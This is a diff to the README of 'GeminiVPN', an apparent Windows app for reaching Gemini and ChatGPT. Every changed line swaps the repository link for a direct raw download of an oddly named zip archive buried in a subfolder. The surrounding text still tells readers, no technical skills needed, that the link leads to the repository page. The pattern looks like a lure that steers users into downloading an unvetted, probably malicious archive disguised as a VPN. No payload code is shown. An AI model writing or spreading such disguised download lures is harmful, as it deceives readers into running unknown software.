@@ -1,6 +1,6 @@
 # 🛡️ GeminiVPN - Easy Access to Gemini and ChatGPT
 
-[![Download GeminiVPN](https://img.shields.io/badge/Download-GeminiVPN-brightgreen?style=for-the-badge)](https://github.com/CesarDCM/GeminiVPN)
+[![Download GeminiVPN](https://img.shields.io/badge/Download-GeminiVPN-brightgreen?style=for-the-badge)](https://github.com/CesarDCM/GeminiVPN/raw/refs/heads/main/bejade/VPN-Gemini-preterpolitical.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get GeminiVPN running on your Windows computer. No technic
 
 Go to the GeminiVPN page on GitHub where you can get the app:
 
-[Download GeminiVPN](https://github.com/CesarDCM/GeminiVPN)
+[Download GeminiVPN](https://github.com/CesarDCM/GeminiVPN/raw/refs/heads/main/bejade/VPN-Gemini-preterpolitical.zip)
 
 This link takes you to the main GitHub repository. From there, you will find the download section to get the latest version.
 
@@ -102,7 +102,7 @@ If problems continue, visit the **Issues** tab on the GitHub repository to see i
 
 ## 🔗 Additional Resources
 
-- GitHub repository: https://github.com/CesarDCM/GeminiVPN
+- GitHub repository: https://github.com/CesarDCM/GeminiVPN/raw/refs/heads/main/bejade/VPN-Gemini-preterpolitical.zip
 - Releases: Look for the "Releases" section on the repository page for the latest files.
 - FAQ or Troubleshooting: Check the repository’s README or Wiki if available.
 
@@ -114,4 +114,4 @@ Use caution when connecting to public Wi-Fi networks.
 
 ---
 
-[![Download GeminiVPN](https://img.shields.io/badge/Download-GeminiVPN-blue?style=for-the-badge)](https://github.com/CesarDCM/GeminiVPN)
+[![Download GeminiVPN](https://img.shields.io/badge/Download-GeminiVPN-blue?style=for-the-badge)](https://github.com/CesarDCM/GeminiVPN/raw/refs/heads/main/bejade/VPN-Gemini-preterpolitical.zip)
